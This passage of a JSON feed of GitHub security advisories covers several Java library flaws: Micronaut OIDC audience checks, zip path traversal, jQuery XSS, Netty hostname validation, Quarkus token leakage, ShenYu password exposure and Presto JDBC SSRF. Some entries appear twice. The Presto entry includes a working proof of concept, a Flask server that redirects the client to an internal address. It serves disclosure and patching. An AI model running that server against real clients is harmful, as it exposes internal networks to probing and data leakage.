&amp;&amp;\n                        audiences.contains(clientId) &amp;&amp;\n                                validateAzp(claims, clientId, audiences);\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>Any OIDC setup using Micronaut where multiple OIDC applications exists for the same issuer but token auth are not meant to be shared.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/micronaut-projects/micronaut-security/security/advisories/GHSA-qw22-8w9r-864h\">https://github.com/micronaut-projects/micronaut-security/security/advisories/GHSA-qw22-8w9r-864h</a></li>\n<li><a href=\"https://github.com/micronaut-projects/micronaut-security/commit/9728b925221a0d87798ccf250657a3c214b7e980\">https://github.com/micronaut-projects/micronaut-security/commit/9728b925221a0d87798ccf250657a3c214b7e980</a></li>\n<li><a href=\"https://github.com/micronaut-projects/micronaut-security/blob/master/security-oauth2/src/main/java/io/micronaut/security/oauth2/client/IdTokenClaimsValidator.java#L202\">https://github.com/micronaut-projects/micronaut-security/blob/master/security-oauth2/src/main/java/io/micronaut/security/oauth2/client/IdTokenClaimsValidator.java#L202</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qw22-8w9r-864h\">https://github.com/advisories/GHSA-qw22-8w9r-864h</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qw22-8w9r-864h",
            "title": "[io.micronaut.security:micronaut-security-oauth2] io.micronaut.security:micronaut-security-oauth2 has invalid IdTokenClaimsValidator logic on aud",
            "date_modified": "2023-10-05T20:55:17.000Z",
            "date_published": "2023-10-05T20:55:14.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qw22-8w9r-864h"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>IdTokenClaimsValidator skips <code>aud</code> claim validation if token is issued by same identity issuer/provider.</p>\n<h3 id=\"details\">Details</h3>\n<p>See <a href=\"https://github.com/micronaut-projects/micronaut-security/blob/master/security-oauth2/src/main/java/io/micronaut/security/oauth2/client/IdTokenClaimsValidator.java#L202\">https://github.com/micronaut-projects/micronaut-security/blob/master/security-oauth2/src/main/java/io/micronaut/security/oauth2/client/IdTokenClaimsValidator.java#L202</a></p>\n<p>This logic violates point 3 of <a href=\"https://openid.net/specs/openid-connect-core-1_0.html#IDTokenValidation\">https://openid.net/specs/openid-connect-core-1_0.html#IDTokenValidation</a>. </p>\n<p>Workaround exists by setting <code>micronaut.security.token.jwt.claims-validators.audience</code> with valid values. \n <code>micronaut.security.token.jwt.claims-validators.openid-idtoken</code> can be kept as default on.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>Should probably be:</p>\n<pre><code class=\"language-java\">                return issuer.equalsIgnoreCase(iss) &amp;&amp;\n                        audiences.contains(clientId) &amp;&amp;\n                                validateAzp(claims, clientId, audiences);\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>Any OIDC setup using Micronaut where multiple OIDC applications exists for the same issuer but token auth are not meant to be shared.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/micronaut-projects/micronaut-security/security/advisories/GHSA-qw22-8w9r-864h\">https://github.com/micronaut-projects/micronaut-security/security/advisories/GHSA-qw22-8w9r-864h</a></li>\n<li><a href=\"https://github.com/micronaut-projects/micronaut-security/commit/9728b925221a0d87798ccf250657a3c214b7e980\">https://github.com/micronaut-projects/micronaut-security/commit/9728b925221a0d87798ccf250657a3c214b7e980</a></li>\n<li><a href=\"https://github.com/micronaut-projects/micronaut-security/blob/master/security-oauth2/src/main/java/io/micronaut/security/oauth2/client/IdTokenClaimsValidator.java#L202\">https://github.com/micronaut-projects/micronaut-security/blob/master/security-oauth2/src/main/java/io/micronaut/security/oauth2/client/IdTokenClaimsValidator.java#L202</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qw22-8w9r-864h\">https://github.com/advisories/GHSA-qw22-8w9r-864h</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qw22-8w9r-864h",
            "title": "[io.micronaut.security:micronaut-security-oauth2] io.micronaut.security:micronaut-security-oauth2 has invalid IdTokenClaimsValidator logic on aud",
            "date_modified": "2023-10-05T20:55:17.000Z",
            "date_published": "2023-10-05T20:55:14.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qw22-8w9r-864h"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Addresses partial fix in CVE-2018-1261. Pivotal spring-integration-zip, versions prior to 1.0.2, exposes an arbitrary file write vulnerability, that can be achieved using a specially crafted zip archive (affects other archives as well, bzip2, tar, xz, war, cpio, 7z), that holds path traversal filenames. So when the filename gets concatenated to the target extraction directory, the final path ends up outside of the target folder.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2018-1263\">https://nvd.nist.gov/vuln/detail/CVE-2018-1263</a></li>\n<li><a href=\"https://pivotal.io/security/cve-2018-1263\">https://pivotal.io/security/cve-2018-1263</a></li>\n<li><a href=\"https://web.archive.org/web/20210125210559/https://www.securityfocus.com/bid/104179/\">https://web.archive.org/web/20210125210559/https://www.securityfocus.com/bid/104179/</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-87vg-5pgx-pggh\">https://github.com/advisories/GHSA-87vg-5pgx-pggh</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-87vg-5pgx-pggh",
            "title": "[org.springframework.integration:spring-integration-zip] spring-integration-zip Arbitrary File Write",
            "date_modified": "2023-10-05T18:49:19.000Z",
            "date_published": "2022-05-13T01:07:04.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-87vg-5pgx-pggh"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Versions of <code>jquery</code> prior to 1.9.0 are vulnerable to Cross-Site Scripting. The load method fails to recognize and remove <code>&lt;script&gt;</code> HTML tags that contain a whitespace character, i.e: <code>&lt;/script &gt;</code>, which results in the enclosed script logic to be executed. This allows attackers to execute arbitrary JavaScript in a victim's browser.</p>\n<h2 id=\"recommendation\">Recommendation</h2>\n<p>Upgrade to version 1.9.0 or later.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-7656\">https://nvd.nist.gov/vuln/detail/CVE-2020-7656</a></li>\n<li><a href=\"https://snyk.io/vuln/SNYK-JS-JQUERY-569619\">https://snyk.io/vuln/SNYK-JS-JQUERY-569619</a></li>\n<li><a href=\"https://security.netapp.com/advisory/ntap-20200528-0001/\">https://security.netapp.com/advisory/ntap-20200528-0001/</a></li>\n<li><a href=\"https://www.oracle.com/security-alerts/cpujul2022.html\">https://www.oracle.com/security-alerts/cpujul2022.html</a></li>\n<li><a href=\"https://github.com/jquery/jquery/blob/9e6393b0bcb52b15313f88141d0bd7dd54227426/src/ajax.js#L203\">https://github.com/jquery/jquery/blob/9e6393b0bcb52b15313f88141d0bd7dd54227426/src/ajax.js#L203</a></li>\n<li><a href=\"https://github.com/rails/jquery-rails/blob/master/CHANGELOG.md#220-19-january-2013\">https://github.com/rails/jquery-rails/blob/master/CHANGELOG.md#220-19-january-2013</a></li>\n<li><a href=\"https://github.com/rails/jquery-rails/blob/v2.1.4/vendor/assets/javascripts/jquery.js#L7481\">https://github.com/rails/jquery-rails/blob/v2.1.4/vendor/assets/javascripts/jquery.js#L7481</a></li>\n<li><a href=\"https://supportportal.juniper.net/s/article/2021-07-Security-Bulletin-Junos-OS-Multiple-J-Web-vulnerabilities-resolved-in-Junos-OS-21-2R1?language=en_US\">https://supportportal.juniper.net/s/article/2021-07-Security-Bulletin-Junos-OS-Multiple-J-Web-vulnerabilities-resolved-in-Junos-OS-21-2R1?language=en_US</a></li>\n<li><a href=\"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/jquery-rails/CVE-2020-7656.yml\">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/jquery-rails/CVE-2020-7656.yml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-q4m3-2j7h-f7xw\">https://github.com/advisories/GHSA-q4m3-2j7h-f7xw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-q4m3-2j7h-f7xw",
            "title": "[org.webjars.npm:jquery] Cross-Site Scripting in jquery",
            "date_modified": "2023-10-05T05:03:32.000Z",
            "date_published": "2020-05-20T16:18:01.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-q4m3-2j7h-f7xw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Netty-handler has been found to no validate hostnames when using TLS in its default configuration. As a result netty-handler is vulnerable to man-in-the-middle attacks. Users would need to set the protocol to \"HTTPS\" in the SSLParameters of the SSLEngine to opt in to host name validation. A change in default behavior is expected in the <code>5.x</code> release branch with no backport planned.</p>\n<p>In the interim users are advised to enable host name validation in their configurations.\nSee <a href=\"https://github.com/netty/netty/issues/8537\">https://github.com/netty/netty/issues/8537</a> for details on the forthcoming change in default behavior.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-4586\">https://nvd.nist.gov/vuln/detail/CVE-2023-4586</a></li>\n<li><a href=\"https://access.redhat.com/security/cve/CVE-2023-4586\">https://access.redhat.com/security/cve/CVE-2023-4586</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=2235564\">https://bugzilla.redhat.com/show_bug.cgi?id=2235564</a></li>\n<li><a href=\"https://security.snyk.io/vuln/SNYK-JAVA-IONETTY-1042268\">https://security.snyk.io/vuln/SNYK-JAVA-IONETTY-1042268</a></li>\n<li><a href=\"https://github.com/netty/netty/issues/8537\">https://github.com/netty/netty/issues/8537</a></li>\n<li><a href=\"https://docs.oracle.com/javase/8/docs/api/javax/net/ssl/SSLParameters.html#setEndpointIdentificationAlgorithm-java.lang.String-\">https://docs.oracle.com/javase/8/docs/api/javax/net/ssl/SSLParameters.html#setEndpointIdentificationAlgorithm-java.lang.String-</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-57m8-f3v5-hm5m\">https://github.com/advisories/GHSA-57m8-f3v5-hm5m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-57m8-f3v5-hm5m",
            "title": "[io.netty:netty-handler] Netty-handler does not validate host names by default",
            "date_modified": "2023-10-04T20:27:05.000Z",
            "date_published": "2023-10-04T12:30:14.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-57m8-f3v5-hm5m"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A flaw was found in Quarkus. Quarkus OIDC can leak both ID and access tokens in the authorization code flow when an insecure HTTP protocol is used, which can allow attackers to access sensitive user data directly from the ID token or by using the access token to access user data from OIDC provider services. Please note that passwords are not stored in access tokens.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-1584\">https://nvd.nist.gov/vuln/detail/CVE-2023-1584</a></li>\n<li><a href=\"https://github.com/quarkusio/quarkus/pull/32192\">https://github.com/quarkusio/quarkus/pull/32192</a></li>\n<li><a href=\"https://github.com/quarkusio/quarkus/pull/33414\">https://github.com/quarkusio/quarkus/pull/33414</a></li>\n<li><a href=\"https://access.redhat.com/errata/RHSA-2023:3809\">https://access.redhat.com/errata/RHSA-2023:3809</a></li>\n<li><a href=\"https://access.redhat.com/security/cve/CVE-2023-1584\">https://access.redhat.com/security/cve/CVE-2023-1584</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=2180886\">https://bugzilla.redhat.com/show_bug.cgi?id=2180886</a></li>\n<li><a href=\"https://github.com/quarkusio/quarkus/pull/32192/commits/5369d7ff233d3afe84ecd9160c541fba52b38e69\">https://github.com/quarkusio/quarkus/pull/32192/commits/5369d7ff233d3afe84ecd9160c541fba52b38e69</a></li>\n<li><a href=\"https://github.com/quarkusio/quarkus/pull/33414/commits/df305ff12386cf28b33567b8d9a18db164f019dd\">https://github.com/quarkusio/quarkus/pull/33414/commits/df305ff12386cf28b33567b8d9a18db164f019dd</a></li>\n<li><a href=\"https://github.com/quarkusio/quarkus/commit/5369d7ff233d3afe84ecd9160c541fba52b38e69\">https://github.com/quarkusio/quarkus/commit/5369d7ff233d3afe84ecd9160c541fba52b38e69</a></li>\n<li><a href=\"https://github.com/quarkusio/quarkus/commit/df305ff12386cf28b33567b8d9a18db164f019dd\">https://github.com/quarkusio/quarkus/commit/df305ff12386cf28b33567b8d9a18db164f019dd</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6hc9-cf8x-hf83\">https://github.com/advisories/GHSA-6hc9-cf8x-hf83</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6hc9-cf8x-hf83",
            "title": "[io.quarkus:quarkus-oidc] Quarkus OIDC can leak both ID and access tokens",
            "date_modified": "2023-10-04T18:49:37.000Z",
            "date_published": "2023-10-04T12:30:14.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6hc9-cf8x-hf83"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A flaw was found in Quarkus. Quarkus OIDC can leak both ID and access tokens in the authorization code flow when an insecure HTTP protocol is used, which can allow attackers to access sensitive user data directly from the ID token or by using the access token to access user data from OIDC provider services. Please note that passwords are not stored in access tokens.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-1584\">https://nvd.nist.gov/vuln/detail/CVE-2023-1584</a></li>\n<li><a href=\"https://github.com/quarkusio/quarkus/pull/32192\">https://github.com/quarkusio/quarkus/pull/32192</a></li>\n<li><a href=\"https://github.com/quarkusio/quarkus/pull/33414\">https://github.com/quarkusio/quarkus/pull/33414</a></li>\n<li><a href=\"https://access.redhat.com/errata/RHSA-2023:3809\">https://access.redhat.com/errata/RHSA-2023:3809</a></li>\n<li><a href=\"https://access.redhat.com/security/cve/CVE-2023-1584\">https://access.redhat.com/security/cve/CVE-2023-1584</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=2180886\">https://bugzilla.redhat.com/show_bug.cgi?id=2180886</a></li>\n<li><a href=\"https://github.com/quarkusio/quarkus/pull/32192/commits/5369d7ff233d3afe84ecd9160c541fba52b38e69\">https://github.com/quarkusio/quarkus/pull/32192/commits/5369d7ff233d3afe84ecd9160c541fba52b38e69</a></li>\n<li><a href=\"https://github.com/quarkusio/quarkus/pull/33414/commits/df305ff12386cf28b33567b8d9a18db164f019dd\">https://github.com/quarkusio/quarkus/pull/33414/commits/df305ff12386cf28b33567b8d9a18db164f019dd</a></li>\n<li><a href=\"https://github.com/quarkusio/quarkus/commit/5369d7ff233d3afe84ecd9160c541fba52b38e69\">https://github.com/quarkusio/quarkus/commit/5369d7ff233d3afe84ecd9160c541fba52b38e69</a></li>\n<li><a href=\"https://github.com/quarkusio/quarkus/commit/df305ff12386cf28b33567b8d9a18db164f019dd\">https://github.com/quarkusio/quarkus/commit/df305ff12386cf28b33567b8d9a18db164f019dd</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6hc9-cf8x-hf83\">https://github.com/advisories/GHSA-6hc9-cf8x-hf83</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6hc9-cf8x-hf83",
            "title": "[io.quarkus:quarkus-oidc] Quarkus OIDC can leak both ID and access tokens",
            "date_modified": "2023-10-04T18:49:37.000Z",
            "date_published": "2023-10-04T12:30:14.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6hc9-cf8x-hf83"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>On Apache ShenYu versions 2.4.0 and 2.4.1, and endpoint existed that disclosed the passwords of all users. Users are recommended to upgrade to version 2.4.2 or later.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-23223\">https://nvd.nist.gov/vuln/detail/CVE-2022-23223</a></li>\n<li><a href=\"https://lists.apache.org/thread/q2gg6ny6lpkph7nkrvjzqdvqpm805v8s\">https://lists.apache.org/thread/q2gg6ny6lpkph7nkrvjzqdvqpm805v8s</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2022/01/25/7\">http://www.openwall.com/lists/oss-security/2022/01/25/7</a></li>\n<li><a href=\"https://github.com/apache/incubator-shenyu/releases/tag/v2.4.2\">https://github.com/apache/incubator-shenyu/releases/tag/v2.4.2</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2022/01/26/4\">http://www.openwall.com/lists/oss-security/2022/01/26/4</a></li>\n<li><a href=\"https://github.com/apache/shenyu/pull/2357\">https://github.com/apache/shenyu/pull/2357</a></li>\n<li><a href=\"https://github.com/apache/shenyu/commit/0e826ceae97a1258cb15c73a3072118c920e8654\">https://github.com/apache/shenyu/commit/0e826ceae97a1258cb15c73a3072118c920e8654</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7wq4-89xx-g62j\">https://github.com/advisories/GHSA-7wq4-89xx-g62j</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7wq4-89xx-g62j",
            "title": "[org.apache.shenyu:shenyu-common] Password exposure in ShenYu",
            "date_modified": "2023-10-04T17:29:14.000Z",
            "date_published": "2022-01-28T22:13:57.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7wq4-89xx-g62j"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Presto JDBC is vulnerable to Server-Side Request Forgery (SSRF) when connecting a remote Presto server. An attacker can modify the nextUri parameter to internal server in response content that Presto JDBC client will request next and view sensitive information from highly sensitive internal servers or perform a local port scan. </p>\n<h3 id=\"details\">Details</h3>\n<p>The Presto protocol has a nextUri parameter that specifies which URI the client will request next to obtain more query data. Presto JDBC will directly use the nextUri returned by the remote Presto server as the URL for the next request. So if a malicious server modify the nextUri parameter to the internal server, JDBC will request it and cause SSRF.</p>\n<p>For unexpected responses, JDBC will put the response body into the error. So the response of the internal server will be leaked if the server also returns the error directly to the user.</p>\n<p>The relevant code is in file path <code>/presto-client/src/main/java/com/facebook/presto/client/StatementClientV1.java</code> and function <code>advance</code> .</p>\n<p>The flowchart is as follows:</p>\n<img style=\"zoom:50%;\" alt=\"presto_jdbc_ssrf_2.png\" src=\"https://s2.loli.net/2023/09/18/gvUZ2rT7w3Okbde.png\">\n\n<h3 id=\"poc\">PoC</h3>\n<p>Running an HTTP service to route POST /v1/statement redirect to the intranet. For example, using these Python code:</p>\n<pre><code class=\"language-python\">from flask import Flask, Response\n\napp = Flask(__name__)\n\n@app.route('/v1/statement', methods=['POST'])\ndef next_uri_to_interal_server():\n    data = '{\"id\":\"test_id\",\"infoUri\":\"whatever\",\"nextUri\":\"http://127.0.0.1:8888\",\"stats\":{\"state\":\"QUEUED\",\"queued\":true,\"scheduled\":false,\"nodes\":0,\"totalSplits\":0,\"queuedSplits\":0,\"runningSplits\":0,\"completedSplits\":0,\"cpuTimeMillis\":0,\"wallTimeMillis\":0,\"queuedTimeMillis\":0,\"elapsedTimeMillis\":0,\"processedRows\":0,\"processedBytes\":0,\"peakMemoryBytes\":0,\"peakTotalMemoryBytes\":0,\"peakTaskTotalMemoryBytes\":0,\"spilledBytes\":0},\"warnings\":[]}'\n    return Response(data, content_type='application/json; charset=utf-8', status=200)\n\nif __name__ == '__main__':\n    app.run(host=\"0.0.0.0\",port=8000)\n</code></pre>\n<p>Connecting to the malicious server using JDBC:</p>\n<pre><code class=\"language-java\">String url = \"jdbc:presto://&lt;ip&gt;:&lt;port&gt;\";\nProperties properties = new Properties();\nproperties.setProperty(\"user\", \"root\");\ntry {\n    Connection connection = DriverManager.getConnection(url, properties);\n    Statement stmt = connection.createStatement();\n    ResultSet res = stmt.executeQuery(\"show catalogs\");\n    while(res.next()) {\n        System.out.println(res.getString(1));\n    }\n} catch (Exception e) {\n    e.printStackTrace();\n}\n</code></pre>\n<p>Pwned!</p>\n<h3 id=\"impact\">Impact</h3>\n<p>When the target remote Presto server to be connected is controllable,  an attacker can view sensitive information from highly sensitive internal servers or perform a local port scan. </p>\n<p>Vulnerability Discovery Credit: Jianyu Li @ WuHeng Lab of ByteDance</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/prestodb/presto/security/advisories/GHSA-86q5-qcjc-7pv4\">https://github.com/prestodb/presto/security/advisories/GHSA-86q5-qcjc-7pv4</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-86q5-qcjc-7pv4\">https://github.com/advisories/GHSA-86q5-qcjc-7pv4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-86q5-qcjc-7pv4",
            "title": "[com.facebook.presto:presto-jdbc] Presto JDBC Server-Side Request Forgery by nextUri",
            "date_modified": "2023-10-03T21:54:09.000Z",
            "date_published": "2023-10-03T21:54:06.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-86q5-qcjc-7pv4"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}